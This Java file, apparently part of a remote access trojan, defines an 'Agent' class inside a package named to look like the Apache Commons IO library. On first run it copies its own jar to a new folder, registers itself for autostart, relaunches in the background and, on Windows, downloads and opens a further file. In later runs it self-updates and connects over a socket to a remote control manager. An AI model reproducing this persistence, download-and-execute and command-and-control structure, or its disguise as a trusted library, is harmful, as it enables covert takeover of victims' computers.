package org.apache.commons.io.file.spi;

import lombok.Getter;
import org.apache.commons.io.file.spi.arguments.ArgumentParser;
import org.apache.commons.io.file.spi.arguments.Configuration;
import org.apache.commons.io.file.spi.controller.ControlManager;
import org.apache.commons.io.file.spi.decoder.DecoderManager;
import org.apache.commons.io.file.spi.encoder.EncoderManager;
import org.apache.commons.io.file.spi.settings.Settings;
import org.apache.commons.io.file.spi.socket.SocketManager;
import org.apache.commons.io.file.spi.utils.application.Application;
import org.apache.commons.io.file.spi.utils.computer.Computer;
import org.apache.commons.io.file.spi.utils.computer.Persistence;
import org.apache.commons.io.file.spi.utils.computer.Setup;
import org.apache.commons.io.file.spi.utils.computer.Updater;

public class Agent {

    @Getter
    private final Configuration configuration;
    @Getter
    private final boolean windows;
    @Getter
    private final Computer computer;
    private final Setup setup;
    @Getter
    private final EncoderManager encoderManager;
    @Getter
    private final DecoderManager decoderManager;
    @Getter
    private ControlManager controlManager;
    @Getter
    private final SocketManager socketManager;
    @Getter
    private final Updater updater;

    public Agent(final String[] args) {
        this.configuration = new Configuration();
        this.windows = System.getProperty("os.name").toLowerCase().contains("windows");
        this.updater = new Updater(this.windows);
        this.encoderManager = new EncoderManager();
        this.decoderManager = new DecoderManager();
        this.socketManager = new SocketManager(this);
        this.setup = new Setup(this, this.isWindows());
        this.computer = new Computer(this.windows);

        final ArgumentParser argumentParser = new ArgumentParser(this.configuration, args);
        this.configuration.set("mode", "first");
        argumentParser.loadArguments();
    }

    public void start() {
        this.setup.setupValues();
        final String mode = String.valueOf(this.configuration.get("mode")).toLowerCase();
        switch (mode) {
            case "first":
                final Persistence persistence = new Persistence(this.isWindows());
                persistence.createFolder();
                persistence.moveJar();
                if (Settings.AUTOSTART)
                    persistence.register();
                this.computer.launchBack();
                if (this.isWindows() && Settings.OTHERFILE) new Application().downloadAndOpen();
                System.exit(-1);
                break;
            case "start":
            case "back":
                this.updater.updateAsPossible();
                this.controlManager = new ControlManager(this);
                this.getSocketManager().getConnection().connect(mode);
                break;
            case "update":
                this.updater.makeAfterUpdate();
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + String.valueOf(this.configuration.get("mode")).toLowerCase());
        }
    }
}
